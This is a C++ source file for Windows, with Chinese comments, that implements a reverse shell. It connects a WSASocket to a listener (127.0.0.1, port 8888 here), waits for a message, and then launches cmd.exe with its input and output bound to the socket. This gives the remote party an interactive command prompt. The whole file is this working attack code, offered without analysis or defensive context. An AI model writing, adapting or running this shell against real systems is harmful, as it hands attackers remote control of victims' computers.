#include<winsock2.h>
#include<windows.h>
#include<iostream>

using std::cout;
using std::cin;
using std::endl;

#pragma comment(lib, "ws2_32.lib")

void Initialization();

void Display_Error(const char* sentence);

void Initialization()
{
	LPWSADATA lpWSAData;
	lpWSAData = new WSADATA;
	if (WSAStartup(2.2, lpWSAData))
	{
		cout << "Failed to Initialization" << endl;
		exit(1);
	}
}


void Display_Error(const char* sentence)
{
	cout << sentence << endl;
	WSACleanup();
	exit(1);
}


int main()
{
	//初始化
	Initialization();

	SOCKET	S = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
	if (S == INVALID_SOCKET)
	{
		const char* Error = "Failed to create socket";
		Display_Error(Error);
	}

	sockaddr_in SocketAddr;
	ZeroMemory(&SocketAddr, sizeof(SocketAddr));
	SocketAddr.sin_family = AF_INET;
	SocketAddr.sin_port = htons(8888);
	SocketAddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");

	if (WSAConnect(S, (const sockaddr*)& SocketAddr, sizeof(sockaddr),NULL,NULL,NULL,NULL))
	{
		cout << WSAGetLastError() << endl;
		closesocket(S);
		const char* Error_1 = "Failed to connect server";
		Display_Error(Error_1);
	}
	else
	{
		char* recv_buffer = new char[1000];
		ZeroMemory(recv_buffer, 1000);
		if (!recv(S, recv_buffer, 1000, 0))
		{
			closesocket(S);
			const char* Error_1 = "Failed to Continue";
			Display_Error(Error_1);
		}
		else
		{
			char Process_Name[] = "cmd.exe";
			STARTUPINFOA StartupInfo;
			PROCESS_INFORMATION Process_Information;

			//修改进程启动配置
			memset(&StartupInfo, 0, sizeof(StartupInfo));
			StartupInfo.cb = sizeof(STARTUPINFO);
			StartupInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
			StartupInfo.hStdInput = StartupInfo.hStdOutput = StartupInfo.hStdError = (HANDLE)S;
			StartupInfo.wShowWindow = SW_SHOW;

			//创建命令行程序
			if (!CreateProcess(NULL, Process_Name, NULL, NULL, true, NULL, NULL, NULL, &StartupInfo, &Process_Information))
			{
				closesocket(S);
				const char* Error = "Failed to create cmd process";
				Display_Error(Error);
			}

			WaitForSingleObject(Process_Information.hProcess, INFINITE);

			CloseHandle(Process_Information.hProcess);

			CloseHandle(Process_Information.hThread);

			closesocket(S);
		}
	}
	return 0;
}